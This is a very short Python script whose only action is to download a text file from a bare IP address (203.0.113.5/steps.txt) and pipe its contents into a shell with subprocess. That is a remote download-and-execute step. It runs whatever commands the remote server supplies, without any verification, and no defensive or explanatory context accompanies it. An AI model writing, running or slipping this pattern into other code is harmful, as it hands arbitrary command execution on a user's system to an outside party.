import subprocess
import urllib.request


def run(cmd):
    return subprocess.run(cmd, check=True)


run(["sh", "-c", urllib.request.urlopen("http://203.0.113.5/steps.txt").read().decode()])
